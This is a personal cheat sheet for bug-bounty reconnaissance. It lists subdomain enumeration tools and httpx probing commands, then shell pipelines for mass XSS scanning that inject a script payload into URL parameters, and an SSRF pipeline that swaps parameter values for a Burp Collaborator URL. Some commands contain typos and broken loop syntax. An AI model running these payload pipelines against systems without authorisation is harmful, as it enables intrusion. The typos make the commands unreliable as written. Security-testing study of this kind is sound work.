Recon for Bugbounty

* Working of website

1. Basic/Passive Recon
  * wappalyzer , technology built with
  * whois
  * data breaches
  * emails
  * social media 

2. Passive Recon 
    * Subdomain Enumeration
        crt.sh  --> webiste for finding subdomain
        dnsdumpster.com
        nmmapper.com
        subfinder
        sublist3r
        assetsfinder
        findomain
        amass
        Knock / Knockpy
        Aquatone
        Subdomainizer
        Finddomain

        AltDNS  -> https://media.licdn.com/dms/image/v2/D4D12AQGgzjdRzuYhfQ/article-inline_image-shrink_1500_2232/article-inline_image-shrink_1500_2232/0/1678537423766?e=1731542400&v=beta&t=SvklTIP9osxJiSstnezrFMFG_Bujs393jNCZeG3oux0
        
        DNS-Recon
        Recon-ng 
    * sorting subdomain lists
      cat subdomain.txt  | sort -u | uniq | tee -a sorted_domain.txt    

      
      gem install aquatone

      httprobe --> Convert To URL

      cat sub.txt | httprobe | tee -a httprobe.txt 
      cat httprobe.txt | urlprobe   --> checking status code
      cat hosts.txt | aquatone -out ~/aquatone/example.com

      AquaTone Article - https://www.geeksforgeeks.org/aquatone-tool-for-domain-flyovers/

      httpx
      gau
      gf
      dalfox
      skipfish
      uniscan
      

httpx -mc 200 -l url.txt

httpx -mc 200 -sc -tech -title -ip -probe -l url.txt

httpx -mc 200 -sc -p 8080 -l url.txt

httpx -mc 200,403,404 -sc -tech -ct -csv -o data.csv -l url.txt



1.ParamSpider
2.Gxss
3. Dalfox

#ParamSpider 
python3 paramspider.py --domail abcd.com --exclude png,svg,jpg,jpeg

#Arjun
arjun -u targeturl?=FUZZ

cat url.txt | Gxss -p ABCD

cat url.txt | Gxss -p ABCD | dalfox pipe -mining-dict param.txt --skip-bav
cat url.txt | Gxss -p ABCD | dalfox pipe --mass



cat url.txt | gf xss | grep 'source=' | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confitm(1)" && echo "$host \033{0;31mVulnerable\n}"; done


SSRF
findomain -t domain.com -q | httpx -silent -threads 1000 | gau | grep "=" | qsreplace http://BurpCollabratorURL
